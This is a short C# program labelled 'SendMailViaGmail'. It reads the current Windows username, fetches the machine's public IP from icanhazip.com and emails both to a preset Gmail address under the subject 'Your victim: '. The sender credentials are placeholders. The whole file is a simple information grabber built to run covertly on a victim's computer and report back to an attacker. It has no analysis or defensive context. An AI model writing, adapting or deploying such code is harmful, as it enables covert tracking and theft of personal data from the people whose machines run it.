using System;
using System.Net;
using System.Net.Mail;
using System.Linq;
using System.Security.Principal;
using Microsoft.Win32;
using System.Runtime.InteropServices;

namespace SendMailViaGmail
{
   class Program
   {
   static void Main(string[] args)
   {
      string user = Environment.UserName;
      var ip = new WebClient().DownloadString("http://icanhazip.com");       //Downloading and saving ip to string      
      

      
      
      string SendersAddress = "SenderEmail@gmail.com"; //ONLY GMAIL!
      string ReceiversAddress = "ReceiverEmail@gmail.com"; 
      const string SendersPassword = "PASSWORD"; //PASSWORD to email here
      const string subject = "Your victim: "; //subject
      const string body = "IP: "; //Body

      try
      {
        
        //gmails smtp server name is smtp.gmail.com and port number is 587
        SmtpClient smtp = new SmtpClient
        {
           Host = "smtp.gmail.com",
           Port = 587,
           EnableSsl = true,
           DeliveryMethod = SmtpDeliveryMethod.Network,
           Credentials    = new NetworkCredential(SendersAddress, SendersPassword),
           Timeout = 3000 //do not change
        };

      
       
        MailMessage message = new MailMessage(SendersAddress, ReceiversAddress, subject + user , body + ip);
        smtp.Send(message); //Send message
        
     }

     catch (Exception ex)
     {
        Console.WriteLine(ex.Message);
      
     }
    }
   }
 }